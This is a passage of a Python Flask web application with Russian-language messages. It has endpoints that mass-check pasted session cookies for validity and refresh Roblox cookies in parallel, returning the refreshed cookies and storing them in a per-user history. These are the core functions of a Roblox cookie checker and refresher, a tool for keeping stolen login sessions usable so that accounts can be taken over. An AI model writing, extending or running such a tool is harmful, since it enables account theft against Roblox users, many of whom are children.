    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'usernames': [], 'results': formatted, 'full_reports': []})
    return jsonify({"success": True, "results": formatted})

@app.route("/api/fresher", methods=["POST"])
@login_required
def api_fresher():
    data = request.json or {}
    cookies_list = extract_cookies_from_text(data.get("cookies", ""))
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    only_cookies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c) for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res: only_cookies.append(res)
    add_fresher_history({'mode': 'duplicate', 'refreshed_count': len(only_cookies), 'usernames': [], 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
@login_required
def api_history_checker():
    return jsonify({"history": get_checker_history()})

@app.route("/api/history/clear/<type>", methods=["POST"])
@login_required
def api_clear_history(type):
    sid = session.get('user_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM checker_history WHERE user_id=?", (sid,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
